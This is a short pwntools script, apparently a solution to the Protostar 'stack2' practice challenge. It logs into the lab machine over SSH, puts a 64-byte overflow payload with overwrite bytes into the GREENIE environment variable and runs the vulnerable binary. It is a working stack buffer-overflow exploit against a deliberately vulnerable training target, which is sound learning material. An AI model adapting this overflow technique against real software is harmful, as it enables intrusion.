from pwn import *
import os

ip = os.getenv("PROTOSTAR")
shell = ssh('user', ip, password='user')
sh = shell.run("sh")
sh.sendline("cd /opt/protostar/bin/")

exploit = "A"*64 + "\x0a\x0d\x0a\x0d"

sh.sendline("export GREENIE=\"%s\"" % exploit)
sh.sendline("./stack2")

print(sh.recvline())